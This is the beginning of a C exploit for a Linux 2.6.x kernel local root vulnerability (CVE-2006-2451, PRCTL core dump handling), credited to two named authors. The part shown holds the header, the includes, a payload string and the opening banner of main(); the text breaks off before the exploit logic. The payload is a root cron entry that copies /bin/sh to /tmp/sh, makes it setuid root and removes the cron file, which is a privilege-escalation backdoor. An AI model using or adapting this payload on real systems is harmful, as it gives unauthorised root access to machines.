/*****************************************************/
/* Local r00t Exploit for:                           */
/* Linux Kernel PRCTL Core Dump Handling             */
/* ( BID 18874 / CVE-2006-2451 )                     */
/* Kernel 2.6.x  (>= 2.6.13 && < 2.6.17.4)           */
/* By:                                               */
/* - dreyer    <luna@aditel.org>   (main PoC code)   */
/* - RoMaNSoFt <roman@rs-labs.com> (local root code) */
/*                                  [ 10.Jul.2006 ]  */
/*****************************************************/

#include <stdio.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <unistd.h>
#include <linux/prctl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <signal.h>

char *payload="\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n* * * * *   root   cp /bin/sh /tmp/sh ; chown root /tmp/sh ; chmod 4755 /tmp/sh ; rm -f /etc/cron.d/core\n";

int main() {
   int child;
   struct rlimit corelimit;
   printf("Linux Kernel 2.6.x PRCTL Core Dump Handling - Local r00t\n");
   printf("By: dreyer & RoMaNSoFt\n");
   printf("[ 10.Jul.2006 ]\n\n");